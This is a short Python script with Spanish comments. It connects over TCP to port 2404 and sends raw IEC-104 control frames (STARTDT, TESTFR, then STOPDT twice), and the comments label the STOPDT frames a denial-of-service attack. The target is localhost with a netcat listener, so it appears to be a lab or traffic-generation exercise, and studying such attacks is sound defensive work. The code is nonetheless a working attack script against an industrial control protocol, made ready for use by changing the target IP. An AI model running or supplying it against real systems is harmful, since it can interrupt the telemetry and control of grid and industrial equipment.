import socket
import time
import sys

# --- CONFIGURACIÓN ---
# ¡IMPORTANTE! Pon aquí la MISMA IP que usaste en el netcat (Terminal 1)
TARGET_IP = "127.0.0.1"  
TARGET_PORT = 2404

def enviar_trafico():
    print(f"🔌 Conectando a {TARGET_IP}:{TARGET_PORT}...")
    
    try:
        # 1. Crear el socket (TCP convencional)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        print("✅ Conexión TCP establecida (Handshake OK).")
        
        # 2. Definir los paquetes en HEXADECIMAL puro
        # Formato IEC-104 APCI: [Inicio 68] [Largo] [Control 1] [Control 2] [Control 3] [Control 4]
        
        # STARTDT Act (Start Data Transfer) -> Hex: 68 04 07 00 00 00
        pkt_startdt = b'\x68\x04\x07\x00\x00\x00'
        
        # STOPDT Act (Stop Data Transmission - ATAQUE) -> Hex: 68 04 13 00 00 00
        pkt_stopdt  = b'\x68\x04\x13\x00\x00\x00'
        
        # TESTFR Act (Test Frame) -> Hex: 68 04 43 00 00 00
        pkt_testfr  = b'\x68\x04\x43\x00\x00\x00'

        # 3. Enviar Secuencia
        print("📤 Enviando STARTDT (Inicio de sesión)...")
        s.send(pkt_startdt)
        time.sleep(1)
        
        print("📤 Enviando TESTFR (Keep-Alive)...")
        s.send(pkt_testfr)
        time.sleep(1)
        
        print("🚨 ENVIANDO ATAQUE: STOPDT (Denegación de Servicio)...")
        s.send(pkt_stopdt)
        time.sleep(1)
        
        # Enviar otra vez para asegurar
        s.send(pkt_stopdt)
        
        print("🏁 Tráfico enviado. Cerrando conexión.")
        s.close()

    except ConnectionRefusedError:
        print("❌ ERROR: No se pudo conectar. ¿Está corriendo 'nc -l -k ...' en la otra terminal?")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    enviar_trafico()
